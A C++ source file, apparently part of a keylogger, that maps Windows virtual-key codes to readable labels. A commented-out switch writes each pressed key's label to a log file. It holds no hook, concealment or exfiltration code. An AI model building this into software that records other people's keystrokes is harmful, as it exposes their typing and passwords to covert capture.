#include "EventsKeyList.h"
map<int,string> KeyMap::Key;
KeyMap::KeyMap(){
    this->Key[0x30]="0";
    this->Key[0x31]="1";
    this->Key[0x32]="2";
    this->Key[0x33]="3";
    this->Key[0x34]="4";
    this->Key[0x35]="5";
    this->Key[0x36]="6";
    this->Key[0x37]="7";
    this->Key[0x38]="8";
    this->Key[0x39]="9";
    this->Key[0x41]="A";
    this->Key[0x42]="B";
    this->Key[0x43]="C";
    this->Key[0x44]="D";
    this->Key[0x45]="E";
    this->Key[0x46]="F";
    this->Key[0x47]="G";
    this->Key[0x48]="H";
    this->Key[0x49]="I";
    this->Key[0x4A]="J";
    this->Key[0x4B]="K";
    this->Key[0x4C]="L";
    this->Key[0x4D]="M";
    this->Key[0x4E]="N";
    this->Key[0x4F]="O";
    this->Key[0x50]="P";
    this->Key[0x51]="Q";
    this->Key[0x52]="R";
    this->Key[0x53]="S";
    this->Key[0x54]="T";
    this->Key[0x55]="U";
    this->Key[0x56]="V";
    this->Key[0x57]="W";
    this->Key[0x58]="X";
    this->Key[0x59]="Y";
    this->Key[0x5A]="Z";
    this->Key[VK_SPACE]="[SPACEBAR]";
    this->Key[VK_SHIFT]="[SHIFT]";
    this->Key[VK_RETURN]="[ENTER]";
    this->Key[VK_BACK]="[BACKSPACE]";
    this->Key[VK_TAB]="[TAB]";
    this->Key[VK_CONTROL]="[CTRL]";
    this->Key[VK_MENU]="[ALT]";
    this->Key[VK_PRIOR]="[PAGE UP]";
}
/*switch(*x) {
		case VK_PRIOR:
		strcat(buff, " [PAGE UP]\r\n");
		fputs(buff, file);
		fclose(file);
		break;
		case VK_NEXT:
		strcat(buff, " [PAGE DOWN]\r\n");
		fputs(buff, file);
		fclose(file);
		break;
		case VK_END:
		strcat(buff, " [END]\r\n");
		fputs(buff, file);
		fclose(file);
		break;
		case VK_HOME:
		strcat(buff, " [HOME]\r\n");
		fputs(buff, file);
		fclose(file);
		break;
		case VK_LEFT:
		strcat(buff, " [LEFT ARROW]\r\n");
		fputs(buff, file);
		fclose(file);
		break;
		case VK_UP:
		strcat(buff, " [UP ARROW]\r\n");
		fputs(buff, file);
		fclose(file);
		break;
		case VK_RIGHT:
		strcat(buff, " [RIGHT ARROW]\r\n");
		fputs(buff, file);
		fclose(file);
		break;
		case VK_DOWN:
		strcat(buff, " [DOWN ARROW]\r\n");
		fputs(buff, file);
		fclose(file);
		break;
		case VK_SNAPSHOT:
		strcat(buff, " [PRINT SCREEN]\r\n");
		fputs(buff, file);
		fclose(file);
		break;
		case VK_INSERT:
		strcat(buff, " [INSERT]\r\n");
		fputs(buff, file);
		fclose(file);
		break;
		case VK_DELETE:
		strcat(buff, " [DEL]\r\n");
		fputs(buff, file);
		fclose(file);
		break;
		case VK_OEM_1:
		strcat(buff, " [;:]\r\n");
		fputs(buff, file);
		fclose(file);
		break;
		case VK_OEM_2:
		strcat(buff, " [/?]\r\n");
		fputs(buff, file);
		fclose(file);
		break;
		case VK_OEM_3:
		strcat(buff, " [`~]\r\n");
		fputs(buff, file);
		fclose(file);
		break;
		case VK_OEM_4:
		strcat(buff, " [[{]\r\n");
		fputs(buff, file);
		fclose(file);
		break;
		case VK_OEM_5:
		strcat(buff, " [\|]\r\n");
		fputs(buff, file);
		fclose(file);
		break;
		case VK_OEM_6:
		strcat(buff, " []}]\r\n");
		fputs(buff, file);
		fclose(file);
		break;
		case VK_OEM_7:
		strcat(buff, " ["\"]\r\n");
		fputs(buff, file);
		fclose(file);
		break;
		case 187:
		strcat(buff, " +\r\n");
		fputs(buff, file);
		fclose(file);
		break;
		case 188:
		strcat(buff, " ,\r\n");
		fputs(buff, file);
		fclose(file);
		break;
		case 189:
		strcat(buff, " -\r\n");
		fputs(buff, file);
		fclose(file);
		break;
		case 190:
		strcat(buff, " .\r\n");
		fputs(buff, file);
		fclose(file);
		break;
		case VK_NUMPAD0:
		strcat(buff, " 0\r\n");
		fputs(buff, file);
		fclose(file);
		break;
		case VK_NUMPAD1:
		strcat(buff, " 1\r\n");
		fputs(buff, file);
		fclose(file);
		break;
		case VK_NUMPAD2:
		strcat(buff, " 2\r\n");
		fputs(buff, file);
		fclose(file);
		break;
		case VK_NUMPAD3:
		strcat(buff, " 3\r\n");
		fputs(buff, file);
		fclose(file);
		break;
		case VK_NUMPAD4:
		strcat(buff, " 4\r\n");
		fputs(buff, file);
		fclose(file);
		break;
		case VK_NUMPAD5:
		strcat(buff, " 5\r\n");
		fputs(buff, file);
		fclose(file);
		break;
		case VK_NUMPAD6:
		strcat(buff, " 6\r\n");
		fputs(buff, file);
		fclose(file);
		break;
		case VK_NUMPAD7:
		strcat(buff, " 7\r\n");
		fputs(buff, file);
		fclose(file);
		break;
		case VK_NUMPAD8:
		strcat(buff, " 8\r\n");
		fputs(buff, file);
		fclose(file);
		break;
		case VK_NUMPAD9:
		strcat(buff, " 9\r\n");
		fputs(buff, file);
		fclose(file);
		break;
		case VK_MULTIPLY:
		strcat(buff, " *\r\n");
		fputs(buff, file);
		fclose(file);
		break;
		case VK_ADD:
		strcat(buff, " +\r\n");
		fputs(buff, file);
		fclose(file);
		break;
		case VK_SUBTRACT:
		strcat(buff, " -\r\n");
		fputs(buff, file);
		fclose(file);
		break;
		case VK_DIVIDE:
		strcat(buff, " /\r\n");
		fputs(buff, file);
		fclose(file);
		break;
		case VK_F1:
		strcat(buff, " F1\r\n");
		fputs(buff, file);
		fclose(file);
		break;
		case VK_F2:
		strcat(buff, " F2\r\n");
		fputs(buff, file);
		fclose(file);
		break;
		case VK_F3:
		strcat(buff, " F3\r\n");
		fputs(buff, file);
		fclose(file);
		break;
		case VK_F4:
		strcat(buff, " F4\r\n");
		fputs(buff, file);
		fclose(file);
		break;
		case VK_F5:
		strcat(buff, " F5\r\n");
		fputs(buff, file);
		fclose(file);
		break;
		case VK_F6:
		strcat(buff, " F6\r\n");
		fputs(buff, file);
		fclose(file);
		break;
		case VK_F7:
		strcat(buff, " F7\r\n");
		fputs(buff, file);
		fclose(file);
		break;
		case VK_F8:
		strcat(buff, " F8\r\n");
		fputs(buff, file);
		fclose(file);
		break;
		case VK_F9:
		strcat(buff, " F9\r\n");
		fputs(buff, file);
		fclose(file);
		break;
		case VK_F10:
		strcat(buff, " F10\r\n");
		fputs(buff, file);
		fclose(file);
		break;
		case VK_F11:
		strcat(buff, " F11\r\n");
		fputs(buff, file);
		fclose(file);
		break;
		case VK_F12:
		strcat(buff, " F12\r\n");
		fputs(buff, file);
		fclose(file);
		break;
		case VK_NUMLOCK:
		strcat(buff, " [NUM LOCK]\r\n");
		fputs(buff, file);
		fclose(file);
		break;
		case VK_SCROLL:
		strcat(buff, " [SCROLL LOCK]\r\n");
		fputs(buff, file);
		fclose(file);
		break;
		case VK_VOLUME_MUTE:
		strcat(buff, " Volume Mute\r\n");
		fputs(buff, file);
		fclose(file);
		break;
		case VK_VOLUME_DOWN:
		strcat(buff, " Volume Down\r\n");
		fputs(buff, file);
		fclose(file);
		break;
		case VK_VOLUME_UP:
		strcat(buff, " Volume Up\r\n");
		fputs(buff, file);
		fclose(file);
		break;
		case VK_MEDIA_NEXT_TRACK:
		strcat(buff, " Next Track\r\n");
		fputs(buff, file);
		fclose(file);
		break;
		case VK_MEDIA_PREV_TRACK:
		strcat(buff, " Previous Track\r\n");
		fputs(buff, file);
		fclose(file);
		break;
		case VK_MEDIA_STOP:
		strcat(buff, " Stop Media\r\n");
		fputs(buff, file);
		fclose(file);
		break;
		case VK_MEDIA_PLAY_PAUSE:
		strcat(buff, " Play/Pause Media\r\n");
		fputs(buff, file);
		fclose(file);
		break;
		case VK_CAPITAL:
		strcat(buff, " [CAPS LOCK]\r\n");
		fputs(buff, file);
		fclose(file);
		break;
		case VK_ESCAPE:
		strcpy(buff, tempo);
		strcat(buff, " [ESC]\r\n");
		fputs(buff, file);
		fclose(file);
		break;*/